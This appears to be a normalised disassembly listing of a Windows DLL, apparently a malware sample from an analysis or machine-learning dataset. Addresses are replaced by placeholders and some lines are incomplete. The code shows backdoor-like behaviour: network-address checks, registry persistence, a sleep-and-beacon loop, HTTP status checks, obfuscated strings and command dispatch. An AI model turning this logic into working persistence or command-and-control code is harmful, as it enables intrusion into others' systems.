mov [ ebp - 0x10 ] esi
call sub_100031d3
mov [ esi ] eax
lea eax [ ebp - 0xc ]
and [ ebp - 0xc ] 0x0
push eax
push [ ebp - 0x8 ]
push edi
call sub_10002fe0
push edi
mov esi eax
call j_sub_10003b81
mov ecx [ ebp - 0xc ]
inc ecx
push ecx
call sub_10003ba2
mov edi [ ebp - 0x10 ]
mov [ edi + 0x4 ] eax
push [ ebp - 0xc ]
push esi
push eax
call sub_10003373
push esi
call j_sub_10003b81
mov eax [ ebp + 0x8 ]
add esp 0x30
mov [ eax ] 0x2
sub_10004f3e
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
and [ eax ] 0x0
mov ebx ecx
push 0xe
push r--data
call sub_100031d3
push 0x6
push r--data
mov [ ebp - 0x8 ] eax
call sub_100031d3
push 0x3
push r--data
mov edi eax
call sub_100031d3
push 0x2
push r--data
mov [ ebp - 0x4 ] eax
call sub_100031d3
push r--data
push [ ebp + 0x8 ]
push eax
call sub_10002605
movaps xmm0 [ r--data ]
mov esi eax
push r--data
lea eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] 0x0
push eax
push esi
push r--data
push edi
movups [ ebp - 0x1c ] xmm0
call sub_10002605
add esp 0x40
mov [ ebp + 0x8 ] eax
push edi
call sub_10002c4c
push esi
call sub_10002c4c
cmp [ ebx + 0x20 ] 0x0
pop ecx
pop ecx
push [ ebp + 0xc ]
mov ecx ebx
je r-xdata
push [ ebp - 0x4 ]
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call sub_10004897
push 0x0
push [ ebp - 0x4 ]
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call sub_100049f0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_10005007
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
call sub_100041da
mov [ edi + 0x14 ] eax
call sub_10003df3
push 0x10
mov [ edi + 0x4 ] eax
call sub_10003b6a
xor esi esi
pop ecx
test eax eax
je r-xdata
mov eax esi
mov ecx eax
call sub_10006285
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x8
mov [ ebx ] 0x2
call sub_10002b17
pop ecx
mov [ edi + 0xc ] eax
cmp [ ebx ] esi
jbe r-xdata
push eax
mov ecx edi
call sub_10005508
lea ebx [ edi + 0x10 ]
mov ecx edi
push ebx
call sub_10004e31
mov [ edi + 0xc ] eax
cmp [ ebx ] esi
jne r-xdata
mov eax r--data
mov [ ebp - 0x4 ] eax
push 0x2c
push eax
call sub_100031d3
pop ecx
pop ecx
mov ecx [ edi + 0xc ]
mov [ ecx + esi * 4 ] eax
inc esi
mov eax [ ebp - 0x4 ]
add eax 0x2c
mov [ ebp - 0x4 ] eax
cmp esi [ ebx ]
jb r-xdata
sub_100050b4
push esi
mov esi ecx
push edi
xor edi edi
cmp [ esi + 0x10 ] edi
jbe r-xdata
push [ esi + 0xc ]
call sub_10002c4c
push 0x8
call sub_10002b17
push 0x2c
push r--data
mov [ esi + 0xc ] eax
call sub_100031d3
mov ecx [ esi + 0xc ]
mov [ ecx ] eax
push [ esi + 0x8 ]
call sub_10002ed5
inc eax
push eax
push [ esi + 0x8 ]
call sub_10002ca4
mov ecx [ esi + 0xc ]
add esp 0x1c
mov [ ecx + 0x4 ] eax
xor eax eax
pop edi
mov [ esi + 0x21 ] 0x0
inc eax
pop esi
retn
mov eax [ esi + 0xc ]
push [ eax + edi * 4 ]
call sub_10002c4c
inc edi
pop ecx
cmp edi [ esi + 0x10 ]
jb r-xdata
sub_10005119
push ebp
mov ebp esp
sub esp 0x190
lea eax [ ebp - 0x190 ]
push ebx
push esi
push edi
push 0x190
xor ebx ebx
push ebx
push eax
call sub_10003398
add esp 0xc
lea eax [ ebp - 0x190 ]
push eax
push 0x202
call WSAStartup
mov esi 0x104
push esi
call sub_10003ba2
pop ecx
mov edi eax
push esi
push edi
call gethostname
test eax eax
jne r-xdata
push edi
call j_sub_10003b81
pop ecx
call WSACleanup
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
push edi
call gethostbyname
test eax eax
je r-xdata
mov esi [ eax + 0xc ]
mov edx ebx
cmp [ esi ] ebx
je r-xdata
mov eax ebx
cmp [ eax ] 0x100007f
jne r-xdata
mov ecx [ eax ]
shr ecx 0x8
cmp cl 0xfe
je r-xdata
mov bl 0x1
inc edx
mov eax edx
shl eax 0x2
cmp [ eax + esi ] ebx
jne r-xdata
mov eax [ eax + esi ]
cmp [ eax ] 0xa9
jne r-xdata
jmp r-xdata
sub_100051b9
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor esi esi
inc ebx
cmp [ edi + 0x10 ] esi
jbe r-xdata
cmp [ edi + 0x10 ] ebx
jbe r-xdata
mov eax [ edi + 0xc ]
push [ eax + esi * 4 ]
push [ edi + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov ecx edi
call sub_10005095
mov eax [ edi + 0xc ]
push [ eax + 0x4 ]
call sub_10002ed5
inc eax
push eax
mov eax [ edi + 0xc ]
push [ eax + 0x4 ]
cmp [ edi + 0x8 ] 0x0
je r-xdata
inc esi
cmp esi [ edi + 0x10 ]
jb r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn
mov ecx [ edi + 0x10 ]
lea eax [ ecx - 0x1 ]
cmp esi eax
jne r-xdata
push [ edi + 0x8 ]
call j_sub_10003b81
and [ edi + 0x8 ] 0x0
pop ecx
xor edx edx
lea eax [ esi + 0x1 ]
div ecx
mov eax [ edi + 0xc ]
push [ eax + edx * 4 ]
call sub_10002ed5
inc eax
xor edx edx
push eax
lea eax [ esi + 0x1 ]
div [ edi + 0x10 ]
mov eax [ edi + 0xc ]
push [ eax + edx * 4 ]
jmp r-xdata
cmp ecx ebx
jbe r-xdata
call sub_10002ca4
add esp 0xc
mov [ edi + 0x8 ] eax
jmp r-xdata
mov ecx edi
call sub_10005095
mov eax [ edi + 0xc ]
push [ eax + 0x4 ]
call sub_10002ed5
inc eax
push eax
mov eax [ edi + 0xc ]
push [ eax + 0x4 ]
call sub_10002ca4
add esp 0xc
mov [ edi + 0x8 ] eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_10005287
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x2
push r--data
mov edi ecx
call sub_100031d3
push [ ebp + 0xc ]
mov esi eax
mov [ ebp - 0x4 ] esi
call sub_10002ed5
add esp 0xc
mov ebx eax
mov [ ebp - 0x8 ] ebx
push esi
call [ lstrlenA@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call sub_10002ed5
add eax esi
lea ecx [ ebx + 0x8 ]
add ecx eax
push ecx
call sub_10003ba2
push esi
push [ ebp - 0x4 ]
mov ebx eax
push ebx
call sub_10003373
push 0x1
lea ecx [ ebx + esi ]
push r--data
push ecx
call sub_10003373
inc esi
lea eax [ edi + 0x14 ]
push 0x4
push eax
lea eax [ esi + ebx ]
push eax
call sub_10003373
push [ ebp + 0x8 ]
add esi 0x4
push r--data
lea eax [ esi + ebx ]
push eax
call [ wsprintfA@IAT ]
mov edi [ ebp - 0x8 ]
add esi eax
push edi
push [ ebp + 0xc ]
lea eax [ esi + ebx ]
push eax
call sub_10003373
add esp 0x44
lea eax [ esi + edi ]
push 0x1
push eax
push ebx
call sub_10003225
push ebx
mov esi eax
call j_sub_10003b81
push [ ebp - 0x4 ]
call j_sub_10003b81
add esp 0x14
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_10005350
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
push esi
call sub_10002ed5
push edi
mov [ ebp + 0x8 ] eax
call sub_10002ed5
cmp [ ebp + 0x8 ] 0x0
pop ecx
pop ecx
mov [ ebp + 0x10 ] eax
je r-xdata
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
xor ah ah
xor ecx ecx
xor edi edi
cmp [ edi + ebx ] 0x20
je r-xdata
mov al [ edi + ebx ]
cmp al [ ecx + esi ]
jne r-xdata
inc edi
mov al [ edi + ebx ]
cmp al [ ecx + edx ]
jne r-xdata
xor ecx ecx
inc ecx
cmp ecx [ ebp + 0x8 ]
jne r-xdata
xor ah ah
sub edi ecx
jmp r-xdata
inc ecx
cmp ecx [ ebp + 0x10 ]
jne r-xdata
test ah ah
jne r-xdata
inc edi
cmp edi [ ebp + 0xc ]
jbe r-xdata
inc ah
add edi 0x4
inc edi
cmp [ edi + ebx ] 0x20
je r-xdata
add edi 0x6
mov eax edi
cmp edi [ ebp + 0xc ]
ja r-xdata
sub eax edi
mov [ ebp + 0x14 ] eax
add eax 0xfffffffc
push eax
call sub_10002b17
mov ecx [ ebp + 0x14 ]
mov esi eax
add ecx 0xfffffffb
push ecx
lea ecx [ edi + ebx ]
push ecx
push esi
call sub_10003373
and [ ebp + 0xc ] 0x0
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_10002fe0
push esi
mov edi eax
call sub_10002c4c
push 0xb
push r--data
push [ ebp + 0xc ]
push edi
call sub_10002ede
mov eax [ ebp + 0xc ]
inc eax
push eax
call sub_10002b17
push [ ebp + 0xc ]
mov esi eax
push edi
push esi
call sub_10002bb6
add esp 0x40
push edi
call sub_10002c4c
mov ecx [ ebp + 0xc ]
inc ecx
push ecx
push esi
call sub_10002c6a
add esp 0xc
jmp r-xdata
cmp [ eax + ebx ] 0x3b
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
inc eax
cmp eax [ ebp + 0xc ]
jbe r-xdata
sub_1000547b
push esi
push edi
mov esi ecx
call sub_10005095
push [ esi + 0x4 ]
mov [ esi + 0x20 ] 0x0
call [ lstrlenA@IAT ]
push eax
push [ esi + 0x4 ]
call sub_10003024
pop ecx
pop ecx
mov edi eax
mov ecx esi
push edi
call sub_10005614
test eax eax
je r-xdata
mov ecx esi
call sub_10004dd3
test al al
je r-xdata
push edi
mov ecx esi
call sub_100043d0
push edi
mov ecx esi
call sub_1000565c
push edi
test eax eax
je r-xdata
push edi
mov ecx esi
call sub_10005614
push edi
test eax eax
jne r-xdata
call j_sub_10003b81
pop ecx
pop edi
xor eax eax
pop esi
retn
mov [ esi + 0x20 ] 0x1
jmp r-xdata
call j_sub_10003b81
pop ecx
pop edi
mov ecx esi
pop esi
jmp sub_100051b9
mov ecx esi
call sub_1000565c
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x1
jmp r-xdata
sub_10005508
push ebp
mov ebp esp
push esi
mov esi [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp + 0x8 ]
movzx ecx dx
mov [ esi + ecx * 4 ] eax
inc edx
cmp dx 0x5
jb r-xdata
movzx eax dx
cmp [ esi + eax * 4 ] 0x0
je r-xdata
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_10005531
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x43
push r--data
call sub_100031d3
mov esi [ RegCreateKeyExA@IAT ]
xor edi edi
pop ecx
pop ecx
push edi
mov ebx eax
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ebx
push eax
push edi
push 0x2
push edi
push edi
push edi
push ebx
push 0x80000002
call esi
test eax eax
je r-xdata
push 0x6
push r--data
call sub_100031d3
mov esi [ lstrlenA@IAT ]
mov ebx eax
pop ecx
pop ecx
push [ ebp + 0x8 ]
call esi
push eax
push [ ebp + 0x8 ]
call sub_10003024
pop ecx
pop ecx
mov edi eax
push edi
call esi
push eax
push edi
push 0x1
push 0x0
push ebx
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push edi
call j_sub_10003b81
push ebx
call j_sub_10003b81
pop ecx
pop ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
push [ ebp - 0x8 ]
call j_sub_10003b81
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
lea eax [ ebp - 0x4 ]
push eax
push edi
push 0x2
push edi
push edi
push edi
push ebx
push 0x80000001
call esi
sub_100055e5
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
xor esi esi
cmp [ ecx + 0x20 ] 0x0
je r-xdata
call sub_10005614
xor ecx ecx
inc ecx
test eax eax
cmovne esi ecx
call sub_1000565c
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
inc esi
jmp r-xdata
sub_10005614
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
push [ ebp + 0x8 ]
xor esi esi
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call sub_10004412
mov edi eax
lea eax [ ebp - 0xc ]
push eax
call sub_100043f2
pop ecx
cmp edi 0xc8
je r-xdata
xor esi esi
inc esi
cmp edi 0x194
jne r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000565c
push ebp
mov ebp esp
sub esp 0x3c
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_10004a82
push 0x4
push r--data
mov [ ebp - 0x14 ] eax
call sub_100031d3
pop ecx
pop ecx
mov ecx esi
mov [ ebp - 0x10 ] eax
call sub_10004dc5
mov ecx esi
mov ebx eax
call sub_10004e23
mov ecx esi
mov [ ebp - 0xc ] eax
call sub_10004e15
mov esi eax
lea edi [ ebp - 0x38 ]
push 0x3
pop eax
xor edx edx
test ebx ebx
push 0x9
cmovne edx eax
xor eax eax
pop ecx
[ edi ]
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x34 ] ebx
xor ebx ebx
mov [ ebp - 0x28 ] esi
mov eax [ ecx + 0x4 ]
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x3c ] eax
mov eax [ ecx + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x38 ] edx
push eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10002022
push esi
mov [ ebp + 0x8 ] eax
call j_sub_10003b81
push edi
call j_sub_10003b81
mov eax [ ebp + 0x8 ]
add esp 0x10
test eax eax
je r-xdata
push eax
call sub_10002c4c
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jne r-xdata
cmp [ eax ] 0x32
cmove ebx ecx
sub_10005731
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
mov ebx ecx
push edi
mov [ ebp - 0x10 ] ebx
call sub_10005119
mov esi [ Sleep@IAT ]
mov edi 0x2710
jmp r-xdata
cmp al 0x1
jne r-xdata
push edi
call esi
call sub_10005119
mov ecx ebx
call sub_10005007
jmp r-xdata
mov ecx ebx
call sub_1000547b
test eax eax
je r-xdata
push edi
call esi
mov ecx ebx
call sub_10004551
mov edi eax
jmp r-xdata
push edi
mov ecx ebx
call sub_100055e5
test eax eax
je r-xdata
mov ecx ebx
call sub_100051b9
test eax eax
jne r-xdata
cmp [ ebx + 0x21 ] 0x0
je r-xdata
push 0x2710
call esi
mov ecx ebx
call sub_10004d38
mov [ ebx + 0x21 ] al
test al al
jne r-xdata
push edi
call j_sub_10003b81
pop ecx
jmp r-xdata
push [ ebx + 0x8 ]
mov ecx ebx
call sub_10005531
mov ecx ebx
call sub_100050b4
push 0x1b7740
call esi
call sub_10005119
cmp al 0x1
jne r-xdata
push 0x2710
jmp r-xdata
mov ecx ebx
call sub_1000547b
test eax eax
je r-xdata
push 0x2710
call esi
push 0x1
push r--data
call sub_100031d3
mov edi eax
push 0x1
push r--data
mov [ ebp - 0x14 ] edi
call sub_100031d3
add esp 0x10
mov [ ebp - 0x28 ] eax
mov ecx ebx
push eax
push edi
call sub_10005287
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] eax
mov [ ebx + 0x22 ] 0x0
call sub_10004b7e
mov edi eax
mov [ ebp - 0x1c ] eax
call sub_10004c41
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
cmp [ ebx + 0x21 ] 0x0
je r-xdata
cmp [ ebx + 0x22 ] 0x0
jne r-xdata
test edi edi
jne r-xdata
push [ ebp - 0x4 ]
call j_sub_10003b81
pop ecx
test edi edi
je r-xdata
push [ ebx + 0x8 ]
mov ecx ebx
call sub_10005531
mov ecx ebx
call sub_100050b4
mov ecx ebx
call sub_100051b9
test eax eax
jne r-xdata
push [ ebp - 0x28 ]
call j_sub_10003b81
push [ ebp - 0x14 ]
call j_sub_10003b81
pop ecx
pop ecx
push 0x1b7740
jmp r-xdata
push 0x18
call sub_10003b6a
pop ecx
test eax eax
je r-xdata
push 0x2710
call esi
mov ecx ebx
call sub_10004d38
mov [ ebx + 0x21 ] al
test al al
jne r-xdata
call esi
xor esi esi
mov [ ebp - 0x4 ] esi
jmp r-xdata
push [ ebp - 0x8 ]
mov ecx eax
push edi
call sub_10005b58
mov esi eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
lea ecx [ ebp - 0x8 ]
push ecx
push eax
mov ecx ebx
je r-xdata
cmp [ ebx + 0x22 ] 0x0
mov eax [ ebp - 0x4 ]
je r-xdata
push 0x1b7740
call esi
mov ecx esi
call sub_10005c5f
test al al
jne r-xdata
mov ecx esi
call sub_10005c07
mov edi eax
test edi edi
jne r-xdata
jmp r-xdata
push edi
mov ecx ebx
call sub_10005531
mov eax [ ebx + 0xc ]
push [ eax + 0x4 ]
call j_sub_10003b81
mov esi [ lstrlenA@IAT ]
pop ecx
push edi
call esi
inc eax
push eax
call sub_10003ba2
pop ecx
mov ecx [ ebx + 0xc ]
push edi
mov [ ecx + 0x4 ] eax
call esi
push eax
mov eax [ ebx + 0xc ]
push edi
push [ eax + 0x4 ]
call sub_10003373
push edi
call j_sub_10003b81
push 0x1
push r--data
call sub_100031d3
add esp 0x18
mov edi eax
mov ecx ebx
push edi
push [ ebp - 0x14 ]
call sub_10005287
mov esi eax
mov ecx ebx
push esi
call sub_100055e5
push esi
call j_sub_10003b81
push edi
call j_sub_10003b81
push [ ebx + 0x8 ]
call j_sub_10003b81
mov eax [ ebx + 0xc ]
add esp 0xc
mov esi [ lstrlenA@IAT ]
push [ eax + 0x4 ]
call esi
inc eax
push eax
call sub_10003ba2
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0xc ]
pop ecx
push [ eax + 0x4 ]
call esi
push eax
mov eax [ ebx + 0xc ]
push [ eax + 0x4 ]
push [ ebx + 0x8 ]
call sub_10003373
add esp 0xc
mov ecx ebx
call sub_10004551
mov esi eax
mov ecx ebx
push esi
call sub_100055e5
push esi
call j_sub_10003b81
pop ecx
mov ecx esi
call sub_1000608a
mov [ ebp - 0x18 ] eax
test eax eax
jne r-xdata
push 0x1
push r--data
call sub_100031d3
pop ecx
pop ecx
mov edi eax
mov ecx ebx
push edi
push [ ebp - 0x14 ]
call sub_10005287
mov esi eax
mov ecx ebx
push esi
call sub_100055e5
push esi
call j_sub_10003b81
push edi
call j_sub_10003b81
mov esi [ ebp - 0x4 ]
pop ecx
pop ecx
test esi esi
je r-xdata
push [ ebp - 0x1c ]
call j_sub_10003b81
mov esi [ Sleep@IAT ]
pop ecx
mov ecx esi
call sub_10005b87
push esi
call sub_10003b81
pop ecx
push 0x1
push r--data
call sub_100031d3
pop ecx
pop ecx
push [ ebp - 0x18 ]
mov edi eax
mov ecx ebx
push edi
call sub_10005287
mov esi eax
mov ecx ebx
push esi
call sub_100055e5
push esi
call j_sub_10003b81
push edi
call j_sub_10003b81
push [ ebp - 0x18 ]
call j_sub_10003b81
mov esi [ ebp - 0x4 ]
add esp 0xc
mov ecx esi
call sub_10005bfa
mov edi eax
test edi edi
je r-xdata
mov ecx esi
call sub_1000612c
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
push 0x1
push r--data
call sub_100031d3
pop ecx
pop ecx
push edi
push eax
mov ecx ebx
mov [ ebp - 0x24 ] eax
call sub_10005287
and [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0xc ]
cmp [ ebx + 0x20 ] 0x0
push ecx
mov [ ebp - 0x20 ] eax
mov ecx ebx
push eax
je r-xdata
call sub_10004b7e
call sub_10004c41
jmp r-xdata
push [ ebp - 0x20 ]
call j_sub_10003b81
push [ ebp - 0x24 ]
call j_sub_10003b81
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0xc ]
mov ecx esi
push eax
call sub_10005f00
push 0x1
push r--data
mov ebx eax
call sub_100031d3
pop ecx
pop ecx
mov ecx [ ebp - 0x10 ]
mov edi eax
push ebx
push edi
call sub_10005287
mov ecx [ ebp - 0x10 ]
mov esi eax
push esi
call sub_100055e5
push esi
call j_sub_10003b81
push edi
call j_sub_10003b81
push ebx
call j_sub_10003b81
push [ ebp - 0x18 ]
call j_sub_10003b81
mov ebx [ ebp - 0x10 ]
add esp 0x10
mov esi [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
sub_10005b58
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
xor ecx ecx
push eax
push edx
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] ecx
call sub_10005bd4
pop ecx
pop ecx
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10005b87
push esi
mov esi ecx
push edi
mov edi [ esi ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov ecx edi
call sub_10003515
push edi
call sub_10003b81
pop ecx
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov ecx edi
call sub_100066ab
push edi
call sub_10003b81
pop ecx
and [ esi + 0x14 ] 0x0
and [ esi + 0x10 ] 0x0
pop edi
pop esi
retn
mov ecx edi
call sub_100066c2
push edi
call sub_10003b81
pop ecx
sub_10005bd4
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov [ eax + ecx ] 0x0
cmp dl 0xa
jne r-xdata
mov dl [ eax + ecx ]
cmp dl 0xd
je r-xdata
inc eax
cmp eax [ ebp + 0xc ]
jb r-xdata
sub_10005c07
push ebx
push edi
mov edi ecx
xor ebx ebx
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
pop edi
mov eax ebx
pop ebx
retn
push esi
call sub_100066af
mov esi eax
test esi esi
je r-xdata
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
push esi
call [ lstrlenA@IAT ]
inc eax
push eax
call sub_10003ba2
push esi
mov ebx eax
push r--data
push ebx
call [ wsprintfA@IAT ]
add esp 0x10
and [ edi + 0x4 ] 0x0
pop esi
mov ecx esi
call sub_100066ab
push esi
call sub_10003b81
pop ecx
sub_10005c5f
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
push 0x6
push r--data
mov esi ecx
mov [ ebp - 0x1 ] 0x0
call sub_100031d3
push 0x7
pop edi
push edi
push r--data
mov [ ebp - 0x2c ] eax
call sub_100031d3
mov ebx eax
push 0x6
push r--data
mov [ ebp - 0x8 ] ebx
call sub_100031d3
push edi
push r--data
mov [ ebp - 0x28 ] eax
call sub_100031d3
push 0x8
push r--data
mov [ ebp - 0x24 ] eax
call sub_100031d3
push edi
push r--data
mov [ ebp - 0x20 ] eax
call sub_100031d3
push 0xa
push r--data
mov [ ebp - 0x1c ] eax
call sub_100031d3
push 0xb
push r--data
mov [ ebp - 0x18 ] eax
call sub_100031d3
add esp 0x40
mov [ ebp - 0x14 ] eax
push edi
push r--data
call sub_100031d3
push 0x8
push r--data
mov [ ebp - 0x10 ] eax
call sub_100031d3
mov ecx [ esi + 0x14 ]
add esp 0x10
mov [ ebp - 0xc ] eax
cmp ecx [ esi + 0x10 ]
jae r-xdata
push eax
call j_sub_10003b81
push [ ebp - 0x10 ]
call j_sub_10003b81
push [ ebp - 0x14 ]
call j_sub_10003b81
push [ ebp - 0x18 ]
call j_sub_10003b81
push [ ebp - 0x1c ]
call j_sub_10003b81
push [ ebp - 0x20 ]
call j_sub_10003b81
push [ ebp - 0x24 ]
call j_sub_10003b81
push [ ebp - 0x28 ]
call j_sub_10003b81
push ebx
call j_sub_10003b81
push [ ebp - 0x2c ]
call j_sub_10003b81
mov al [ ebp - 0x1 ]
add esp 0x28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ lstrcmpiA@IAT ]
push [ ebp - 0x2c ]
push eax
call edi
test eax eax
jne r-xdata
inc eax
mov [ esi + 0xc ] eax
lea eax [ ecx + 0x1 ]
mov [ esi + 0x14 ] eax
jmp r-xdata
push ebx
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ebx [ esi ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx [ esi + 0x10 ]
jb r-xdata
push [ ebp - 0x28 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi ]
call sub_1000393f
jmp r-xdata
push 0x14
call sub_10003b6a
pop ecx
test eax eax
je r-xdata
mov ecx ebx
call sub_10003515
push ebx
call sub_10003b81
pop ecx
mov eax [ esi + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp - 0x24 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi ]
call sub_100039e1
jmp r-xdata
push [ esi + 0xc ]
call sub_10002ed5
add [ esi + 0x14 ] eax
add [ esi + 0xc ] eax
cmp [ ebp - 0x1 ] 0x0
pop ecx
jne r-xdata
xor eax eax
mov ecx eax
call sub_10003502
jmp r-xdata
push [ ebp - 0x20 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi ]
call sub_10003962
jmp r-xdata
mov ebx [ ebp - 0x8 ]
jmp r-xdata
mov [ esi ] eax
jmp r-xdata
push [ ebp - 0x1c ]
push [ esi + 0xc ]
call edi
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_100039dc
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
push [ ebp - 0x18 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
push [ ebp - 0x14 ]
push [ esi + 0xc ]
call edi
test eax eax
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
push [ ebp - 0x10 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
push 0x4
call sub_10003b6a
pop ecx
test eax eax
je r-xdata
mov ecx ebx
call sub_100066ab
push ebx
call sub_10003b81
pop ecx
push [ ebp - 0xc ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_100066a5
jmp r-xdata
push [ esi + 0xc ]
mov ecx esi
call sub_10005f62
push 0x4
call sub_10003b6a
pop ecx
test eax eax
je r-xdata
mov ecx ebx
call sub_100066c2
push ebx
call sub_10003b81
pop ecx
mov [ esi + 0x4 ] eax
jmp r-xdata
xor eax eax
mov ecx eax
call sub_100066a5
jmp r-xdata
mov [ esi + 0x8 ] eax
sub_10005f00
push ebp
mov ebp esp
push ebx
push edi
mov edi ecx
xor ebx ebx
mov ecx [ edi ]
test ecx ecx
je r-xdata
pop edi
mov eax ebx
pop ebx
pop ebp
retn 0x8
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10003575
push 0x401
mov esi eax
call sub_10003ba2
pop ecx
mov ecx [ edi ]
mov ebx eax
push esi
call sub_100066af
push eax
push r--data
push ebx
call [ wsprintfA@IAT ]
mov esi [ edi ]
add esp 0x10
test esi esi
je r-xdata
and [ edi ] 0x0
pop esi
mov ecx esi
call sub_10003515
push esi
call sub_10003b81
pop ecx
sub_10005f62
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
push 0x3d
push edi
call sub_100033c6
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x8
mov [ esi ] 0x0
inc esi
push r--data
call sub_100031d3
push 0xa
push r--data
mov [ ebp - 0x10 ] eax
call sub_100031d3
push 0x6
push r--data
mov [ ebp - 0xc ] eax
call sub_100031d3
push 0x2
push r--data
mov [ ebp - 0x8 ] eax
call sub_100031d3
push 0x5
push r--data
mov [ ebp - 0x4 ] eax
call sub_100031d3
add esp 0x28
mov [ ebp + 0x8 ] eax
push [ ebp - 0x10 ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0xc ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
push esi
call sub_10003944
jmp r-xdata
